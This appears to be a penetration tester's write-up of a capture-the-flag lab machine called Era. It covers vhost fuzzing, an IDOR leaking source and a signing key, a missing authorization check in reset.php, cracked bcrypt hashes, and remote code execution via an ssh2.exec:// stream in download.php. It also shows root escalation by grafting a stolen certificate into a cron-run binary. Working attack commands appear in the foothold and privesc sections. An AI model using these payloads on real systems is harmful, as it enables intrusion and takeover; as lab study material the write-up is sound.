# Era — 10.129.50.114

**Started:** 2026-08-20
**Status:** **ROOTED** — user.txt (eric) + root.txt captured

```
vhost fuzz -> file.era.htb
  -> IDOR download.php?id=  -> source archive + ELF signing key (key.pem)
    -> reset.php missing authz -> overwrite admin security answers
      -> security_login.php    -> $_SESSION['erauser'] = 1
        -> download.php show=true + format=ssh2.exec://  -> RCE as yuri
          -> eric:america reused for local login          -> user.txt
            -> root cron runs /opt/AV/.../monitor (group-writable by devs)
               after a .text_sig "signature" grep-check
              -> graft looted cert as .text_sig onto our ELF -> root.txt
```

---

## 1. Infrastructure

`nmap -p- -sV -sC` — full TCP sweep, only two ports open. See
`scans/scripts.nmap`.

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21/tcp | ftp | vsftpd 3.0.5 | current release; no `ftp-anon` output from `-sC`, so anonymous login was **not** accepted |
| 80/tcp | http | nginx 1.18.0 (Ubuntu) | title `Era Designs`; only GET/HEAD advertised |

- nginx 1.18.0 ships in **both** focal (20.04) and jammy (22.04), so it does
  not pin the release on its own. The FTP share's `php8.1_conf` does: PHP 8.1
  is jammy's default, focal's is 7.4. **Working assumption: Ubuntu 22.04
  jammy.** (Earlier note said focal — that was an over-read of the nginx
  version alone.)
- TTL 63 on both → single hop, no NAT/proxy in front.
- 65533 ports came back RST (closed), not filtered — no host firewall dropping.
- Favicon MD5 `0309B7B14DF62A797B431119ADB37B14` — unknown to nmap's DB,
  so not an off-the-shelf CMS/appliance favicon.

Hosts file entry:

```
10.129.50.114  era.htb file.era.htb
```

---

## 2. Enumeration

### Vhosts

**`file.era.htb`** — found by Host-header brute force.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://10.129.50.114/ \
     -H 'Host: FUZZ.era.htb' \
     -fs 154
```

Unknown vhosts return a 154-byte body, so `-fs 154` filters the catch-all
cleanly and any real vhost stands out. First run of this used a DNS-frequency
wordlist and hit on the 5,000-entry list — `file` is a common enough label to
appear in it.

Note there is no DNS involved: `.htb` doesn't resolve anywhere. The vhost was
found by asking nginx what it serves, not by asking a nameserver what exists.
`/etc/hosts` entry added afterwards for browser/tool convenience only.

### Site map

**`era.htb`** — appears fully static. No `.php` anywhere; only asset dirs.

```
/                     main page (19493 bytes -- also the soft-404 body)
/css/                 301
/img/                 301
/js/                  301
    bootstrap.min.js
    custom.js                 <- site-specific, worth reading
    fancybox/jquery.fancybox.pack.js
    jquery-1.11.0.min.js
    jquery-scrolltofixed.js
    jquery.easing.1.3.js
    jquery.isotope.js
    jquery.nav.js
    wow.js
```

Stack of jQuery 1.11.0 + isotope + fancybox + wow.js is a bought/downloaded
HTML template, not bespoke code. Treat it as scenery unless something in
`custom.js` says otherwise.

**`file.era.htb`** — the actual application. PHP.

| Path | Status | Size | Notes |
|------|--------|-----:|-------|
| `/index.php` | 200 | 6765 | app root |
| `/login.php` | 200 | 9214 | biggest page — most form fields |
| `/register.php` | 200 | 3205 | **self-registration is open** |
| `/logout.php` | 200 | 70 | |
| `/layout.php` | 200 | 0 | zero bytes → include-only, not meant to be hit directly |
| `/download.php` | 302 | 0 | auth-gated |
| `/upload.php` | 302 | 0 | auth-gated |
| `/manage.php` | 302 | 0 | auth-gated |
| `/reset.php` | 302 | 0 | auth-gated |
| `/security_login.php` | — | — | **never appeared in any fuzz** — found by browsing |
| `/files` | — | — | from crawl |
| `/hi` | — | — | from crawl; odd name |
| `/license/` | — | — | dir listing; contains `images/main.png` |

The four 302s are a clean auth boundary: everything that does real work
redirects, everything reachable unauthenticated is `index`/`login`/`register`.

`layout.php` at 0 bytes is a shared include — it defines things and emits
nothing on its own.

Observations, no conclusions drawn yet:

- Two separate login endpoints (`login.php` and `security_login.php`) — the
  app has more than one authentication step or more than one auth mechanism.
- A `license/` directory is the signature of off-the-shelf software rather
  than custom code. Identifying the product/version is the obvious next
  question for that directory.
- Upload + file listing + management + reset is a full CRUD surface, i.e. a
  lot of parameter-handling code.

**Filtering reminder:** `era.htb` soft-404s with a 19493-byte 200 for any
unknown path — status codes are useless there, filter on size (`-fs 19493`).
`file.era.htb` had a 154-byte baseline during vhost fuzzing. Do not reuse one
filter value across both vhosts.

### Valid usernames — CONFIRMED

Username enumeration oracle on `security_login.php`. Response body differs by
21 bytes between existing and non-existing accounts:

| Case | Size | Body |
|------|-----:|------|
| invalid user | 5380 | contains "not found" |
| valid user | 5401 | does not |

**Valid:**

```
eric
ethan
john
veronica
yuri
```

**Confirmed NOT valid:** `administrator` (returned 5380, byte-identical to the
`zzzznotauser` control). Worth stating explicitly — assuming an `administrator`
account exists is the default guess and it's wrong here.

None of the five match the three names on the corporate site. `support@era.htb`
is unaccounted for as well.

### Personnel (from the website)

Harvested from site content — useful as a username/password-spray seed list.

| Name | Title |
|------|-------|
| Tom Rensed | Chief Executive Officer |
| Kathren Mory | Vice President |
| Lancer Jack | Senior Manager |

Note `Kathren` and `Lancer Jack` are both non-standard spellings/orderings —
worth keeping verbatim rather than "correcting" them.

### Email

- `support@era.htb` — confirms `era.htb` as the mail domain, and implies at
  least one non-personal role account exists.


---

## 3. Foothold

### IDOR on `download.php?id=`

Files are addressed by a **sequential integer with no ownership check**. A
freshly-registered `test` account can pull files it does not own by walking
the ID space.

| id | Contents |
|----|----------|
| 54 | `site-backup-30-08-24.zip` — full app source + `filedb.sqlite` |
| 150 | `signing.zip` — `key.pem` + `x509.genkey` |

Also pulled: `Screenshot_2026-07-16_09_00_25.png` (3438×1280).

`site-backup-30-08-24.zip` is **byte-identical** to `loot/src/` (`diff -rq`
clean) — one archive, two names. No second version to diff against.

Two implications worth stating separately:

- **Source disclosure.** Whatever the app's server-side logic is, it's now
  readable rather than guessable. Everything after this is white-box.
- **A signing key is not just a credential.** Reading a *password* lets you
  authenticate as one account. Reading a *signing key* lets you mint anything
  that key vouches for — the verifier will accept it as genuine because the
  signature is genuine. Which of those matters depends on what the app signs.

The ID space is small and dense (at least 1–150), so it enumerates cheaply.
Nothing about IDs 1–53, 55–149, or >150 has been checked yet.

### Missing authorization on `reset.php` — account takeover

`reset.php` lets **any authenticated user rewrite any other user's security
answers.**

- Lines 6-9 check only that `$_SESSION['eravalid'] === true` — logged in as
  *anyone*, including a self-registered account.
- Line 23 takes `$username` from `$_POST`.
- Line 31 runs `UPDATE users SET security_answer1..3 = ? WHERE user_name = ?`
  with that POST value.
- **Nothing compares `$_POST['username']` to `$_SESSION['erauser']`.**

The SQL is correctly parameterized. This is not injection — the query is safe
and the *authorization decision* is missing. Worth keeping distinct: prepared
statements stop an attacker changing the query's **shape**; they do nothing
about which row the query was always going to be allowed to touch.

Defeats the stale-backup problem entirely: the rotated answers never need to
be known, only overwritten.

Chain:

```
register test:test          -> eravalid = true
POST reset.php  username=admin_ef01cab31aa & new_answer1..3 = anything
POST security_login.php     -> $_SESSION['erauser'] = 1
                            -> satisfies download.php:59 gate
```

Line 146's "If the user exists, answers have been updated" is a deliberate
non-disclosure message — completely undercut by the 5380/5401 enumeration
oracle on `security_login.php`.

### FTP as `yuri` — password reuse confirmed

```bash
lftp -u yuri,mustang ftp://era.htb -e "ls; bye"
```

```
drwxr-xr-x  2 0 0 4096 Jul 22  2025 apache2_conf
drwxr-xr-x  3 0 0 4096 Jul 22  2025 php8.1_conf
```

- `eric:america` was **rejected** by FTP; only `yuri` reuses.
- Both directories are **uid 0 / gid 0**, mode 755 — readable by yuri,
  writable by nobody but root.
- Contents are server configuration, not user data. Config files leak paths,
  module lists, vhost definitions and sometimes credentials.

**Discrepancy worth chasing:** nmap reports **nginx** on 80, but the FTP share
carries **apache2** config. Either apache runs internally (bound to localhost,
with nginx proxying to it — which would explain why a full TCP scan saw only
nginx), or these are migration leftovers. Which one it is changes what the
config files are actually describing.

Two independent signs point at Apache actually serving `file.era.htb`:
`apache2_conf/file.conf` defines a vhost for exactly that name, and the app
ships a `files/.htaccess` that is *doing something* — nginx ignores `.htaccess`
entirely, so a working deny rule there implies Apache.

### What's in the config share

`apache2.conf` is **stock** — every non-comment line matches Ubuntu's default.
Don't re-read it. Useful lines only:

| File | Line | Content |
|------|-----:|---------|
| `apache2_conf/file.conf` | 3 | `DocumentRoot /var/www/file` ← real path of the app |
| `apache2_conf/file.conf` | 4 | `ServerName file.era.htb` |
| `apache2_conf/apache2.conf` | 170-174 | `<Directory /var/www/>` with `Options Indexes FollowSymLinks` |

`ports.conf` and `000-default.conf` are stock. `php8.1_conf/build/` is
unmodified `php8.1-dev` source.

**Uploads therefore land in `/var/www/file/files/`.**

**Non-default PHP extension present:** `php8.1_conf/ssh2.so` — the PECL
`php-ssh2` package, not part of a stock Ubuntu PHP install, so deliberately
added. Provides `ssh2_connect()`, `ssh2_exec()`, and an `ssh2.sftp://` stream
wrapper. `ffi.so` is also present (ships with PHP, disabled by default). No
`php.ini` in the share, so **which extensions are actually enabled is unknown**.

### Why the uploaded PHP shell never executed

`site-backup-30-08-24.zip` → `files/.htaccess`:

```apache
Order deny,allow
Deny from all

<Files index.php>
    Order allow,deny
    Allow from all
</Files>
```

Everything in the upload dir is 403 except `index.php`, and that file is a
stub containing only a comment. Uploads are reachable **only** through
`download.php`, which `readfile()`s them — bytes out, never parsed as code.

So the failure had two independent causes: no direct URL access to the file,
and no interpreter in the path even if there were.

### Signing key — `loot/key.pem`, `loot/x509.genkey`

`key.pem` contains **two** PEM blocks:

| Lines | Content |
|-------|---------|
| 1–28 | `BEGIN PRIVATE KEY` — RSA 2048, **no passphrase** |
| 29–49 | `BEGIN CERTIFICATE` — the matching self-signed cert |

```
subject = O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
issuer  = same (self-signed)
valid   = 2025-01-26  ->  2125-01-02   (100 years)
```

`x509.genkey:13-17`:

```
basicConstraints = critical,CA:FALSE
keyUsage         = digitalSignature
```

- `digitalSignature` **only** — this key exists to sign and nothing else.
- `CN = ELF verification` — it signs **ELF binaries**.
- `x509.genkey` is the exact filename the Linux kernel uses for its
  module-signing key config; whoever built this followed that convention.
- Private half is unencrypted and in hand.

Implication, stated plainly: **anything on this box that verifies ELF
signatures against this certificate will accept a binary signed with this
key.** What performs that verification is not yet known.

New identity: `yurivich@era.com` — note `.com`, not `.htb`, and it links the
key to the same `yuri` whose password was cracked.

### Editor litter

`css/main.css.save` is a nano crash-recovery file, *older* than `main.css`
(missing the `.dashboard` / `.logout-card` rules). Nothing secret here, but
the class matters: `.save` / `.swp` / `.bak` siblings are free version history
whenever they differ.

### RCE via `ssh2.exec://` in `download.php` — **WORKED**

`download.php:59-79` (admin-only BETA branch) builds an `fopen()` path from
attacker-controlled `$format` and only asks whether it contains `://`. With
the PECL `ssh2` extension installed, `ssh2.exec://user:pass@host/command`
**executes the command on open** — the return value is irrelevant, which is
why `echo $file_content` printing `Resource id #N` never mattered.

```bash
curl -s -G -b 'PHPSESSID=<admin session>' \
  http://file.era.htb/download.php \
  --data-urlencode 'id=54' \
  --data-urlencode 'show=true' \
  --data-urlencode 'format=ssh2.exec://yuri:mustang@127.0.0.1:22/echo <b64>|base64 -d|bash;'
```

**Why it reaches SSH at all:** nmap found only 21 and 80 — sshd is bound to
`127.0.0.1` and invisible externally. But `fopen()` runs *on the box*, so
`download.php` becomes an SSH client on the inside. Classic internal-service
pivot: the port scan was correct and still told you nothing about what's
reachable from within.

Three things had to be solved:

1. **The trailing append.** `$wrapper . $file` always glues
   `files/site-backup-30-08-24.zip` onto the command, producing one nonsense
   token (`idfiles/site-...`). Terminating with `;` ends the command and turns
   the remainder into a separate, harmlessly-failing one.
2. **Encode exactly once.** Hand-writing `%20` *and* using
   `--data-urlencode` double-encodes: `%` → `%25`, the server decodes back to
   a literal `%`, and the shell receives `bash%20-c%20...` as a single token.
   The `Opening:` debug echo shows this directly.
3. **Base64 the payload.** `>`, `&`, quotes and `+` are all hazards across
   URL + shell layers. `echo <b64>|base64 -d|bash` reduces the character set.

**`Opening: ` on line 75 is the whole reason this was debuggable** — it echoes
the exact string passed to `fopen()`, so every failure was diagnosable instead
of silent. Contrast BroScience, where a failed payload and a successful one
looked identical.

Also note: `fopen()` returning a resource proved SSH **auth** succeeded; it
said nothing about whether the command succeeded. Two separate facts that look
the same from outside.

Dead code: the `catch (Exception $e)` on line 77 never fires — `fopen()` raises
`E_WARNING`, not an exception.

---

## 4. Loot & credentials

| Source | User | Secret | Works on |
|--------|------|--------|----------|
| self-registered | `test` | `test` | `file.era.htb` web app |
| cracked bcrypt | `eric` | `america` | web app ✔ · FTP ✘ · **local login ✔ (user.txt)** |
| cracked bcrypt | `yuri` | `mustang` | web app ✔ · FTP ✔ · SSH-via-`ssh2.exec` ✔ (foothold) |
| `filedb.sqlite` | `admin_ef01cab31aa` | security answers `Maria` / `Oliver` / `Ottawa` | **rejected by live app** (rotated) |
| loot (`id=150`) | — | RSA priv key + cert `CN=ELF verification` | signs the root-run `monitor` binary → **root** |

Both cracked accounts log in to `file.era.htb` successfully but own **no
files** — nothing visible beyond what the `test` account already sees. The
value of these credentials is therefore not in the web app; they only matter
if reused elsewhere. Next service to try: **FTP on 21** (vsftpd 3.0.5).

> **The archived DB is stale — but only partly.** `Maria`/`Oliver`/`Ottawa`
> fail against the live `security_login.php`, so the answers were rotated
> after the backup was taken.
>
> **Resolved later:** a dump of the live DB shows all six **password hashes
> byte-identical** to the backup. Passwords were never rotated — consistent
> with `eric:america` and `yuri:mustang` both working. The only drifted
> columns are the admin's three security answers (now
> `youwontguessthis1.0 - 18241283471892739123123` and siblings) and
> `auto_delete_files_after` (600 → 6048000).
>
> Original caution retained because it was right to hold at the time: a
> cracked-but-rejected hash and a failed crack look identical from a login
> form. Worth confirming which usernames still resolve via the 5380/5401
> enumeration oracle before spending GPU hours on any given row.

### `users` table — `loot/src/filedb.sqlite`

The SQLite DB shipped **inside the source archive**, so this is the real
credential store, not a sample.

| id | user_name | auto_delete | sec1 | sec2 | sec3 |
|----|-----------|------------:|------|------|------|
| 1 | `admin_ef01cab31aa` | 600 | Maria | Oliver | Ottawa |
| 2 | `eric` | -1 | NULL | NULL | NULL |
| 3 | `veronica` | -1 | NULL | NULL | NULL |
| 4 | `yuri` | -1 | NULL | NULL | NULL |
| 5 | `john` | -1 | NULL | NULL | NULL |
| 6 | `ethan` | -1 | NULL | NULL | NULL |

**Hashes** — all bcrypt, hashcat `-m 3200`, john `--format=bcrypt`.
Also in `loot/hashes.txt`.

```
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

Prefixes `$2a$` / `$2b$` / `$2y$` are all bcrypt — original, post-2014
wraparound fix, and PHP's variant. Mode 3200 handles all three; the mixed
prefixes just mean the rows were written by different tools at different
times, not one seeding script.

**`yuri` is cost 12, everyone else is cost 10** — 4096 rounds vs 1024, so
that one hash alone costs ~4× the others to attack.

**Cracked:**

| User | Password | Cost | Notes |
|------|----------|------|-------|
| `eric` | `america` | 10 | rockyou, high-frequency candidate |
| `yuri` | `mustang` | 12 | rockyou, likewise |

**Both crackable hashes are now recovered.** HTB's own hint states exactly two
of the six are crackable — so `admin_ef01cab31aa`, `veronica`, `john` and
`ethan` should be treated as **not obtainable this way**, not as unfinished
work. No further GPU/CPU time is warranted on them.

Rate observed: **826 H/s**, CPU-only, no GPU offload. Both hits landed early
because `america` and `mustang` both sit near the top of rockyou — this was a
top-of-list result, not a deep search.

Note the cost-12 row cracked anyway: expense per guess doesn't protect a
password that's in the first fraction of a percent of the wordlist. Cost
factor buys time against *hard* passwords only.

Facts worth keeping separate from any conclusion:

- **Passwords are bcrypt; security answers are plaintext.** Two different
  storage decisions for two things that both authenticate a user.
- **Only `user_id = 1` has security answers set.** Every other row is NULL.
- `download.php` line 59 gates its `show=true` branch on
  `$_SESSION['erauser'] === 1` — i.e. this exact row.
- `auto_delete_files_after` = 600 for the admin, -1 (never) for everyone else.

### Why username enumeration missed the admin

The `security_login.php` oracle found `eric ethan john veronica yuri` — five
of the six accounts. It could never have found `admin_ef01cab31aa`: the
11-hex-char suffix means no wordlist on earth contains it.

So the enumeration was *correct* and *complete for its wordlist*, and still
missed the only account that matters. Same shape as the BroScience
`swap_theme.php` miss — a finished scan is not a finished map. The admin
username came from reading the source archive, not from fuzzing.

**Self-registration is open** on `register.php` — no email confirmation, no
admin approval, no invite code. Account created and logged in successfully.

That crosses the auth boundary found during content discovery: `download.php`,
`upload.php`, `manage.php` and `reset.php` all 302'd unauthenticated and are
now reachable as a normal (non-privileged) user.

---

## 5. Privesc

### Post-foothold enumeration

Shell as `yuri`. **No sudo access.**

Human/interesting accounts from `/etc/passwd`:

| User | uid | Home | Shell | Notes |
|------|----:|------|-------|-------|
| `root` | 0 | `/root` | `/bin/bash` | |
| `eric` | 1000 | `/home/eric` | `/bin/bash` | primary user — full shell |
| `yuri` | 1001 | `/home/yuri` | `/bin/sh` | **us**; no GECOS, lesser shell |
| `ftp` | 108 | `/srv/ftp` | nologin | the vsftpd share root |
| `_laurel` | 999 | `/var/log/laurel` | `/bin/false` | **auditd → Laurel is installed** |

- **`eric:america` works for local login** — password reuse from the app DB to
  the system account. `user.txt` is in `/home/eric`, not `/home/yuri`.
  Note this credential was **rejected by FTP** — vsftpd runs its own user
  list independent of PAM, so an FTP failure says nothing about local auth.
  Two separate auth surfaces, two separate answers; treating the first as
  authoritative would have closed off the account that held the flag.
- **Neither `eric` nor `yuri` has any sudo rights.**
- **Laurel means command logging is active.** Every command and its arguments
  are recorded to `/var/log/laurel/`. Irrelevant to solving the box; very
  relevant as a habit — on a real engagement this is the detection boundary.
- Ubuntu **22.04 jammy** assumption from the FTP share still holds
  (`systemd-timesync`, `pollinate`, `usbmux` line-up matches jammy).

---

### Root cron chain — `pspy` (runs as UID 0)

Two schedules, both root:

**Every minute** — `initiate_monitoring.sh`:

```
/bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
  -> objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
  -> openssl asn1parse -inform DER -in text_sig_section.bin
  -> grep -oP (?<=UTF8STRING        :)Era Inc.
  -> grep -oP (?<=IA5STRING         :)yurivich@era.com
  -> /opt/AV/periodic-checks/monitor        <- EXECUTED AS ROOT
  -> rm -f text_sig_section.bin
```

**Every ~10 min (:00, :10, :20)** — `clean_monitor.sh` resets the binary:

```
cp /root/monitor /opt/AV/periodic-checks/monitor    <- restores pristine copy
chown root:devs /opt/AV/periodic-checks/monitor
chmod g+w /opt/AV/periodic-checks/monitor           <- GROUP-WRITABLE
chmod u+x /opt/AV/periodic-checks/monitor
bash -c 'echo > /opt/AV/periodic-checks/status.log' <- wipes the log
```

Also seen: `answers.sh` at :00 runs the `sqlite3 UPDATE` statements that reset
the admin's security answers — this is what makes the live DB drift from the
backup, and it re-locks the `reset.php` takeover every 10 min. Not part of the
root path, just explains the answer rotation.

**The mechanism, as far as the trace shows it:**

1. `/opt/AV/periodic-checks/monitor` is an ELF with an embedded signature in a
   `.text_sig` section.
2. Before running it, root extracts that section, ASN.1-parses it, and greps
   for `O = Era Inc.` and `emailAddress = yurivich@era.com` — **the exact
   subject of the signing cert in `loot/key.pem` / `x509.genkey`.**
3. If the check passes, root executes the binary.
4. The binary is `chown root:devs` + `chmod g+w` → **writable by the `devs`
   group**, and re-armed every 10 min.

**Why this is the win, stated plainly:** a root-executed binary that is
group-writable, gated by a signature check whose **private key we already
hold** (`download.php?id=150`). Replace `monitor` with our own ELF, sign it so
the `.text_sig` grep passes, wait ≤60s for cron to run it as root.

**To verify before building anything:**

```bash
id                                   # are eric / yuri in group devs?
getent group devs
ls -la /opt/AV/periodic-checks/      # confirm perms + that we can write monitor
file /opt/AV/periodic-checks/monitor
```

If neither foothold user is in `devs`, that group membership is a missing
prerequisite and becomes the next sub-goal.

**Prerequisite MET:**

```
uid=1000(eric) groups=1000(eric),1001(devs)
-rwxrw---- 1 root devs 16544  monitor      <- group rw, we can overwrite
drwxrwxr-- 2 root devs        .            <- group rwx, we can create files
```

`eric` is in `devs`; the binary is group-writable and the dir is group-write.
Full write control over the thing root executes.

**Nature of the "signature check" — inferred, not confirmed.** `pspy` shows
only `objcopy --dump-section` → `openssl asn1parse` → `grep`. There is **no
`openssl dgst -verify`, no `cms -verify`, no `x509 -verify`** anywhere in the
trace. External crypto verification would have to spawn a process and would
show up. It doesn't. So the check appears to be **string presence**: does the
`.text_sig` section, ASN.1-parsed, contain `Era Inc.` and `yurivich@era.com` —
not whether the signature actually covers our `.text`.

`/root/initiate_monitoring.sh` is root-only and unreadable, so the exact
comparison (the bash `if` around those greps) is not directly observable. This
is the one unproven link.

**Enforcement CONFIRMED.** Dropping a plain `gcc`-built reverse shell (no
`.text_sig` section) into `monitor` results in `status.log` reporting the scan
but the binary is **not run** — the wrapper's grep finds no `Era Inc.` /
`yurivich@era.com` and refuses. So a binary must carry a passing `.text_sig` to
be executed as root. `status.log` "System scan / No threats detected" is cover
text for the signature grep.

**Two-tier plan, both viable since we hold the private key:**

1. *If presence-only (likely):* the currently-deployed `monitor` already holds
   a `.text_sig` that passes. Dump it, staple it onto our own ELF, deploy.
   ```
   objcopy --dump-section .text_sig=good_sig.bin monitor   # steal the blob
   objcopy --add-section .text_sig=good_sig.bin evil        # graft onto ours
   ```
2. *If it's a real crypto verify of `.text`:* tier 1 gets reverted without
   running. Then sign our binary's `.text` properly with `loot/key.pem` and
   build a matching `.text_sig`. We own the key, so this is open too.

**Payload:** the ELF runs as root, non-interactively, from cron. A one-shot
action beats a reverse shell here — e.g. `chmod u+s /bin/bash`, or copy bash to
a setuid root shell, or drop an SSH key in `/root`. Non-interactive = reliable.

**Timing:** monitor runs every minute; `clean_monitor.sh` restores pristine at
:00/:10/:20. Write just after a minute boundary → executes within 60s, long
before the 10-min restore reverts it.

### ROOT — WORKED (cert-as-section, no signing needed)

The check is **string presence only**. The wrapper greps the `asn1parse`
output of `.text_sig` for `Era Inc.` and `yurivich@era.com` and never
cryptographically verifies the signature covers `.text`. So grafting the
looted DER **certificate** straight in as the section is sufficient — the
private key was never needed.

```bash
# Kali — turn the looted cert into the section blob (once)
cd loot
awk '/BEGIN CERTIFICATE/,/END CERTIFICATE/' key.pem \
  | openssl x509 -outform DER -out text_sig.der       # ~900 bytes, host + wget it

# target, as eric (group devs)
gcc shell.c -o evil                                    # payload; runs as root from cron
objcopy --add-section .text_sig=text_sig.der evil
cp evil /opt/AV/periodic-checks/monitor
# wait <=60s for the per-minute cron -> payload runs as UID 0 -> root.txt
```

Proof the cert satisfies the grep, checked locally before deploying:

```
openssl x509 ... -outform DER | openssl asn1parse -inform DER
   -> UTF8STRING  :Era Inc.
   -> IA5STRING   :yurivich@era.com
```

`string_mask = utf8only` in `x509.genkey` is **load-bearing**: it forces the
`O` field to encode as `UTF8STRING`, which is exactly what the checker's
`grep -oP '(?<=UTF8STRING        :)Era Inc.'` matches on. Config file and
checker were authored as a matched pair — the `.genkey` was a tell all along.

**Gotcha hit en route:** `objcopy --dump-section .text_sig=… monitor` failed
with `does not exist / file format not recognized`, because an earlier
unsigned-binary test had already overwritten the pristine `monitor`. The
pristine copy only returns on the `:00/:10/:20` `clean_monitor.sh` restore.
Building the section from our **own** looted cert sidesteps that timing
entirely — no need to race a pristine binary.

Also confirmed along the way: dropping a plain `gcc` binary with **no**
`.text_sig` gets logged as a scan in `status.log` but is **not executed** —
enforcement is real, the binary just needs the section present.

---

## 6. Dead ends

- **`/etc/cron.{daily,hourly,weekly,monthly}` are entirely stock.** Only
  `apport`, `apt-compat`, `dpkg`, `logrotate`, `man-db` and `.placeholder`
  files — all Ubuntu defaults, all root-owned `644`/`755`. Nothing custom.
  Still unchecked at time of writing: `/etc/crontab`, `/etc/cron.d/`,
  per-user crontabs, and `systemctl list-timers`.

---

## 7. Lessons

**Enumeration / methodology**

- **A no-hit scan is only a finding once you've proven the scan could hit.**
  The first vhost run returned nothing on the *same wordlist* that later found
  `file.era.htb` — the invocation was broken, not the coverage. Canary-test the
  setup (known-bad + suspected-good) before trusting any negative. This bit us
  on BroScience (`-fc 301`) and again here.
- **One filter value per baseline.** Four different baselines on this box
  (154 / 19493 / 6765 / real-404). Reusing one across targets silently zeroes a
  scan. `era.htb` soft-404s at 200, so status-code matching was useless there.
- **`ffuf -e` extends the wordlist, not the URL.** With template `FUZZ.php`,
  `-e .php,...` tested only `.php` at 6× the request cost. Read the request
  count back against `wordlist × extensions` to catch this.
- **A completed fuzz is not a complete map.** `security_login.php` and the
  `admin_ef01cab31aa` username were both unreachable by any wordlist and came
  from reading source. Same shape as BroScience's `swap_theme.php`.
- **Crawled ≠ fuzzed.** A Burp sitemap reflects what was linked/browsed, not
  proven coverage.

**Auth surfaces are independent**

- `eric:america` was **rejected by FTP but accepted for local login** — vsftpd
  runs its own user list separate from PAM. Treating the FTP failure as
  authoritative would have skipped the account holding user.txt.
- Username **enumeration oracle**: 21-byte body delta (5380 vs 5401) on
  `security_login.php`. Ruled `administrator` out for free.

**Crypto / cracking**

- bcrypt cost factor only protects *hard* passwords. The cost-12 `yuri` hash
  cracked as fast as cost-10 because `mustang` is top-of-rockyou.
- Prepared statements stop query-**shape** injection; they do nothing about
  **authorization**. `reset.php` is perfectly parameterized and still lets any
  user overwrite the admin's row. "Uses prepared statements" ≠ "safe".

**The two big conceptual wins**

- **A port scan describes the perimeter, not what's reachable from inside.**
  sshd on `127.0.0.1:22` was invisible to nmap; `ssh2.exec://` turned a PHP
  `fopen()` into an internal SSH client. The question is never "is the port
  open to me" but "who can reach it once I have code running on the box."
- **Home-grown signature checks are theater unless they actually verify.** The
  `.text_sig` scheme *looked* like code-signing but only grepped for two DN
  strings. No `dgst -verify` in the process trace = no real verification. We
  reproduced a "valid signature" by pasting in the cert we'd already stolen. A
  security control you don't cryptographically bind is a string comparison in a
  trench coat.
- **`fopen()` returning a resource proves the stream opened, not that anything
  succeeded.** SSH auth succeeded ≠ command succeeded; the `Opening:` debug
  echo was what made every failure diagnosable (cf. BroScience, where success
  and failure were indistinguishable and cost extra rounds).

**Encode exactly once, at the outermost layer.** Hand-`%20` + `--data-urlencode`
double-encoded and the shell got `bash%20-c` as one token. Every re-encoding
layer moves you further from the string you meant to send.

---

## 8. Command log

Every command actually run against the target, with its result. Point is
coverage: knowing what was *already* checked, and being able to tell a true
negative from a broken invocation.

```bash
# full TCP + version + default scripts          -> 21/tcp vsftpd, 80/tcp nginx
nmap -p- -sV -sC -oA scans/scripts -vv era.htb

# vhost brute, first attempt                    -> NO HITS (false negative)
#   exact invocation not preserved; same wordlist as the successful run below,
#   so the wordlist was never the problem -- the invocation was.

# vhost brute, second attempt                   -> file.era.htb
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://10.129.50.114/ -H 'Host: FUZZ.era.htb' -fs 154

# content discovery on era.htb                  -> img/, css/, js/ (301s)
#   aborted: wordlist still had its 13-line comment header, and era.htb
#   soft-404s at 200, so every comment line "matched". Re-run with -fs 19493.
ffuf -w .../DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u http://era.htb/FUZZ

# content discovery on file.era.htb             -> index.php login.php
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ \
     -u http://file.era.htb/FUZZ -fs 6765         #  security_login.php reset.php
#                                                 #  upload.php manage.php
#                                                 #  files hi license/
```

```bash
# .php sweep of file.era.htb                    -> + download.php register.php
ffuf -w .../DirBuster-2007_directory-list-2.3-medium.txt:FUZZ \
     -u http://file.era.htb/FUZZ.php \
     -e .php,.html,.txt,.bak,.conf                #  layout.php logout.php
# 1,323,264 reqs / 1052 rps / 21m47s / 0 errors
```

**That `-e` did not do what it looks like it did.** `-e` extends the *wordlist*,
not the URL. Each word became six entries (`index`, `index.php`, `index.html`,
`index.txt`, `index.bak`, `index.conf`), and every one was then substituted
into the template `FUZZ.php`. So the requests were:

```
index.php   index.php.php   index.html.php   index.txt.php   index.bak.php   index.conf.php
```

220,544 × 6 = 1,323,264 — matches the progress counter exactly, which confirms
it. Only the first column was useful. **`.html`, `.txt`, `.bak` and `.conf`
were never actually tested**; the run cost 6× the requests and covered `.php`
alone. Correct form puts the extension work in `-e` and leaves the template
bare:

```bash
ffuf -u http://file.era.htb/FUZZ -e .php,.html,.txt,.bak,.conf ...
```

```bash
# username enum via security_login.php          -> eric ethan john veronica yuri
ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ \
     -u http://file.era.htb/security_login.php -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: PHPSESSID=aih013c2q3q8bnapm9phhttk4q' \
     -H 'Origin: http://file.era.htb' \
     -H 'Referer: http://file.era.htb/security_login.php' \
     -d 'username=FUZZ&answer1=g&answer2=g&answer3=g' \
     -fr 'not found' -t 15
# 10,713 reqs / 369 rps / 28s / 0 errors
```

Baseline was verified *before* the run with a two-case curl (known-bad
`zzzznotauser` vs. suspected-good `administrator`) — both came back 5380,
which proved the filter string and simultaneously ruled out `administrator`.

